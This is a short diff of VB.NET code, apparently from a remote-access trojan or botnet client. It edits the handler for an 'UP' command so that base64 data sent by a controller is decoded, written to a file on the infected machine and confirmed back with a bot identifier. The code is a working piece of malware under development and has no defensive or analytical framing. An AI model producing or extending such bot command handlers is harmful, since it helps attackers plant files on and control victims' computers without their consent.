@@ -121,7 +121,7 @@ cc:
                     Exit Select
 
                 Case "UP"
-                    IO.File.WriteAllBytes(A(1), GZip(SB(A(2)), False))
+                    IO.File.WriteAllBytes(A(1), GZip(Convert.FromBase64String(A(2)), False))
                     Send("UP" + SPL + BOT + SPL + IO.Path.GetFileName(A(1)))
                     Exit Select
 
